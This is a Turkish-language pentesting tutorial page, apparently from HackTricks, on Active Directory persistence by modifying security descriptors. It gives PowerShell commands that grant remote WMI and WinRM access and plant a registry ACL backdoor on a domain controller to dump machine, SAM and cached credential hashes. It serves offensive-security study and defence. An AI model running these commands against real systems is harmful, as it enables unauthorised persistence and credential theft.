# Security Descriptor'lar

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptor'lar

[Dokümantasyondan](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL), bir security descriptor'ı açıklamak için kullanılan formatı tanımlar. SDDL, DACL ve SACL için ACE string'lerini kullanır: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

**Security descriptor'lar**, bir **nesnenin** başka bir **nesne** üzerindeki sahip olduğu **izinleri** **saklamak** için kullanılır. Bir nesnenin **security descriptor'ında** yalnızca **küçük bir değişiklik** **yapabilirseniz**, ayrıcalıklı bir grubun üyesi olmanıza gerek kalmadan bu nesne üzerinde oldukça ilginç ayrıcalıklar elde edebilirsiniz.

Bu nedenle bu persistence tekniği, belirli nesnelere karşı gereken tüm ayrıcalıkları elde ederek genellikle admin ayrıcalıkları gerektiren bir görevi admin olmanıza gerek kalmadan gerçekleştirebilme yeteneğine dayanır.

### WMI'ye Erişim

Bir kullanıcıya **uzaktan WMI çalıştırma** erişimi verebilirsiniz [**bunu kullanarak**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRM'e Erişim

[**Bunu kullanarak**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1) **bir kullanıcıya winrm PS console erişimi verin:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Hash'lere uzaktan erişim

**DAMP** kullanarak bir **Reg backdoor oluşturarak** **registry'ye erişin** ve **hash'leri dump edin**; böylece istediğiniz zaman **bilgisayarın hash'ini**, **SAM'i** ve bilgisayardaki tüm **cached AD** kimlik bilgilerini alabilirsiniz. Bu nedenle, bu izni **Domain Controller bilgisayarına karşı bir normal kullanıcıya** vermek oldukça kullanışlıdır:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
[**Silver Tickets**](silver-ticket.md) ile bir Domain Controller'ın bilgisayar hesabının hash'ini nasıl kullanabileceğinizi öğrenin.

## Referanslar

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
